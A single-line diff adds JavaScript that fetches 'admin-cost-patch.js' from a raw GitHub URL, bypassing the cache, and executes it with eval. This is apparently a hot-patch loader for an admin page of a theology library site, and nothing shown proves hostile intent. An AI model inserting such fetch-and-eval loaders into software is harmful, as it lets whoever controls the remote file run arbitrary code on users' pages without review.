@@ -1,0 +1,1 @@
+fetch('https://raw.githubusercontent.com/buichithan221199-sys/than-theology-library/main/admin-cost-patch.js?v='+Date.now(),{cache:'no-store'}).then(r=>r.text()).then(code=>(0,eval)(code)).catch(e=>console.error('admin cost patch',e));
